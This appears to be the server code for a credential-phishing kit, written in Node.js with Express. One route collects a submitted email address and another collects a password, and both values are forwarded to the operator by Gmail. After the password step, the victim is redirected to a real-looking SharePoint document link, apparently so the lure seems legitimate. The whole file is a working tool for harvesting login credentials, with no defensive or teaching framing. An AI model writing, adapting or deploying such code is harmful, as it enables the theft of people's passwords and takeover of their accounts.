require('dotenv').config();
const express = require('express');
const nodemailer = require('nodemailer');
const bodyParser = require('body-parser');
const path = require('path');

const app = express();
const PORT = 3000;

// Middleware
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname, 'public')));

// Email sender function
async function sendMail(message) {
  const transporter = nodemailer.createTransport({
    service: 'gmail',
    auth: {
      user: process.env.GMAIL_USER,
      pass: process.env.GMAIL_PASS,
    },
  });

  const mailOptions = {
    from: process.env.GMAIL_USER,
    to: process.env.RECIPIENT_EMAIL,
    subject: 'Canvas App Notification',
    text: message,
  };

  await transporter.sendMail(mailOptions);
}

// Route to handle email submission
app.post('/send-email', async (req, res) => {
  const { email } = req.body;
  if (!email) return res.status(400).json({ success: false, message: 'Email missing' });

  try {
    await sendMail(`User entered email: ${email}`);
    res.json({ success: true, redirect: '/thank-you.html' });
  } catch (err) {
    console.error(err);
    res.status(500).json({ success: false, message: 'Error sending email' });
  }
});

// Route to handle password submission
app.post('/send-password', async (req, res) => {
  const { password } = req.body;
  if (!password) return res.status(400).json({ success: false, message: 'Password missing' });

  try {
    await sendMail(`User entered password: ${password}`);
    res.json({
      success: true,
      redirect: 'https://farmersedge-my.sharepoint.com/:w:/g/personal/thom_weir_farmersedge_ca/EU-EAWlqZ4RJpbQskh6diXgBwlF_oaAWM4kc68pxFUwn6A',
    });
  } catch (err) {
    console.error(err);
    res.status(500).json({ success: false, message: 'Error sending password' });
  }
});

// Start server
app.listen(PORT, () => {
  console.log(`Server running at http://localhost:${PORT}`);
});
